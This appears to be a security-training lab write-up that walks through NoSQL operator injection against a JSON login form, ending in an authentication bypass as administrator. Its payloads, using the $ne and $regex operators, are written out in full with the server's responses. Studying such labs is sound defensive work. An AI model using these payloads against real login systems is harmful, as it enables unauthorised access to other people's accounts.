## 1. Initial reconnaissance
- Logged into the application as `wiener:peter`.
- Observed the login request format:
```
POST /login
{"username":"wiener","password":"peter"}
```
- Logged out to begin testing injection payloads.

## 2. Testing methodology
Goal: determine whether username or password fields allow operator objects (NoSQL operator injection).

### Testing password field:
Sent:
```
{"username":"wiener","password":{"$ne":""}}
```
Result: Successfully logged in → password field is injectable.

### Testing username field:
Sent:
```
{"username":{"$ne":""},"password":{"$ne":""}}
```
Result: 500 error (`Query returned unexpected number of records`) → username is also injectable.

## 3. Payload construction
Tried to log in directly as administrator:
```
{"username":"administrator","password":{"$ne":""}}
```
Result: Login failed — probably different username value in database.

Next, used regex operator:
```
{"username":{"$regex":"admin.*"},"password":{"$ne":""}}
```
Meaning:  
- Match any username starting with "admin"  
- Accept any non-empty password  

## 4. Completing the attack
Sent:
```
POST /login
{"username":{"$regex":"admin.*"},"password":{"$ne":""}}
```

Server responded with:
- **302 redirect**  
- Following redirect → authenticated as administrator.

Lab solved.
